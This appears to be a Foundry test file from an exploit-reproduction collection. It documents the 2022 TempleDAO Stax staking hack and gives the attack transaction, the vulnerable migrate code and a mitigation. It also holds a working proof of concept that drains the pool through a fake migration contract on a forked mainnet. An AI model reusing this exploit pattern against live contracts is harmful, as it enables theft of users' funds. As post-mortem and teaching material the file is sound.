// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {IERC20} from '../../interfaces/IERC20.sol';

import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';

// forge test --match-contract Exploit_TempleDAO -vvv
/*
On Oct 11, 2022 an attacker stole ~$2,3MM in Stax tokens from the TempleDAO Protocol.
The attacker managed to call exploit the migrate function of the LP contract.

// Attack Overview
Total Lost: ~$2,3MM in Stax
Attack Tx: https://etherscan.io/tx/0x8c3f442fc6d640a6ff3ea0b12be64f1d4609ea94edd2966f42c01cd9bdcf04b5
Ethereum Transaction Viewer: https://tx.eth.samczsun.com/ethereum/0x8c3f442fc6d640a6ff3ea0b12be64f1d4609ea94edd2966f42c01cd9bdcf04b5

Exploited Contract: https://etherscan.io/address/0xd2869042E12a3506100af1D192b5b04D65137941
Attacker Address: https://etherscan.io/address/0x9c9fb3100a2a521985f0c47de3b4598dafd25b01
Attacker Contract: https://etherscan.io/address/0x2df9c154fe24d081cfe568645fb4075d725431e0
Attack Block:  15725067

// Key Info Sources
Twitter: https://twitter.com/BlockSecTeam/status/1579843881893769222


Principle: Poor access control migrate mechanism

    function migrateStake(address oldStaking, uint256 amount) external {
        StaxLPStaking(oldStaking).migrateWithdraw(msg.sender, amount);
        _applyStake(msg.sender, amount);
    }

    function migrateWithdraw(address staker, uint256 amount) external onlyMigrator {
        _withdrawFor(staker, msg.sender, amount, true, staker);
    }

    function _withdrawFor(
        address staker,
        address toAddress,
        uint256 amount,
        bool claimRewards,
        address rewardsToAddress
    ) internal updateReward(staker) {
        require(amount > 0, "Cannot withdraw 0");
        require(_balances[staker] >= amount, "Not enough staked tokens");

        _totalSupply -= amount;
        _balances[staker] -= amount;

        stakingToken.safeTransfer(toAddress, amount);
        emit Withdrawn(staker, toAddress, amount);
     
        if (claimRewards) {
            // can call internal because user reward already updated
            _getRewards(staker, rewardsToAddress);
        }
    }


ATTACK:
The migrate function allows passing any oldStaking address while migrating the stake without checking allowance or ownership.

MITIGATIONS:
1) Evaluate if it is needed to check allowance or ownership while performing sensitive actions on behalf of others.

*/

interface IStax {
    function migrateStake(address oldStaking, uint256 amount) external;
    function withdrawAll(bool claim) external; 
}

contract Exploit_TempleDAO is TestHarness, TokenBalanceTracker {
    IERC20 internal staxLpToken = IERC20(0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9);
    IStax internal stax = IStax(0xd2869042E12a3506100af1D192b5b04D65137941);

    function setUp() external {
        cheat.createSelectFork('mainnet', 15725066);
        cheat.deal(address(this), 0 ether);

        addTokenToTracker(address(staxLpToken));
        updateBalanceTracker(address(this));
        updateBalanceTracker(address(stax));
    }
    
    function test_attack() external {
        console.log('------- INITIAL STATUS -------');
        console.log('Attacker balances');
        logBalances(address(this));
        console.log('Stax Pool balances');
        logBalances(address(stax));     

        console.log('------- STEP 1: MIGRATE -------');
        address migrationTarget = address(new FakeMigrate{salt: bytes32(0)}());

        uint256 staxBalance = staxLpToken.balanceOf(address(stax));
        stax.migrateStake(migrationTarget, staxBalance);

        console.log('Attacker balances');
        logBalances(address(this));
        console.log('Stax Pool balances');
        logBalances(address(stax));  

        console.log('------- STEP 2: WITHDRAW -------');
        stax.withdrawAll(false);
        
        console.log('Attacker balances');
        logBalances(address(this));
        console.log('Stax Pool balances');
        logBalances(address(stax));  
    }
}

contract FakeMigrate {
    // Migration callback
    function migrateWithdraw(address staker, uint256 amount) external {}
}